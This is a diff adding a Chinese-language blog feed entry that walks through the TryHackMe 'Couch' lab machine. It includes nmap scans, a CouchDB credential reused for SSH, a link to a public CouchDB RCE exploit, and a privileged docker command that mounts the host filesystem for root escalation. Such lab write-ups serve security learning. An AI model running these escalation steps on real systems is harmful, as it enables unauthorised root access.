@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>打靶记录(一零三)之THMCouch</title>
+      <link href="/2024/03/14/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E9%9B%B6%E4%B8%89)%E4%B9%8BTHMCouch/"/>
+      <url>/2024/03/14/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E9%9B%B6%E4%B8%89)%E4%B9%8BTHMCouch/</url>
+      
+        <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap --min-rate=10000 -p- 10.10.23.241</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-14 11:24 UTC</span><br><span class="line">Nmap scan report for ip-10-10-23-241.eu-west-1.compute.internal (10.10.23.241)</span><br><span class="line">Host is up (0.0084s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">5984/tcp open  couchdb</span><br><span class="line">MAC Address: 02:F9:FF:B0:CC:6F (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.46 seconds</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sT -sC -sV -O -p22,5984 10.10.23.241   </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-14 11:25 UTC</span><br><span class="line">Nmap scan report for ip-10-10-23-241.eu-west-1.compute.internal (10.10.23.241)</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 349d390934304b3da71edfeba3b0e5aa (RSA)</span><br><span class="line">|   256 a42eef3a845d211bb9d42613a52ddf19 (ECDSA)</span><br><span class="line">|_  256 e16d4dfdc8008e86c2132dc7ad85139c (ED25519)</span><br><span class="line">5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)</span><br><span class="line">|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)</span><br><span class="line">|_http-title: Site doesn't have a title (text/plain; charset=utf-8).</span><br><span class="line">MAC Address: 02:F9:FF:B0:CC:6F (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.10 - 3.13</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds</span><br></pre></td></tr></tbody></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>访问couchDB的web服务，在secret数据库中找到一个凭据atena:t4qfzcc4qN##,用于ssh登录</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现历史记录没有删，看了一下貌似没有用的东西</p><p>想着利用couchDB的漏洞来RCE看看:</p><p><a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p><p>更改目标IP与反弹shell的IP和端口，执行之后可以得到couch身份的shell但是也没什么用</p><p>当我再回到之前的历史记录，发现是有运行一个docker指令的</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine</span><br></pre></td></tr></tbody></table></figure><p>而且atena用户有运行容器的权限，照样输入，提权成功!</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>还是比较easy的靶机，虽然过程中没有用到，但还是了解了一下couchDB的一些exploit方式</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ContainerVulnerabilitiesTHM</title>
       <link href="/2024/03/14/ContainerVulnerabilitiesTHM/"/>
       <url>/2024/03/14/ContainerVulnerabilitiesTHM/</url>
